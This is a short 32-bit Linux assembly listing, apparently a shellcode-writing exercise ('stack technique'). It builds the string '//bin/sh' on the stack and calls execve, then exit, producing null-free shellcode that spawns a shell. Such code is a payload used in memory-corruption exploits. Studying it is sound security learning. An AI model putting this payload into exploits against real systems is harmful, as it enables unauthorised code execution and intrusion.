;stack technique
global _start


_start:
	
	xor eax, eax	
	xor esi,esi
	push esi
	mov al, 0xb
	
	push 0x68732f6e
	push  0x69622f2f
	
	mov ebx, esp
	mov ecx, esi
	mov edx, esi
	int 80h
	
	xor eax, eax	
	inc eax
	xor ebx, ebx
	int 80h
	
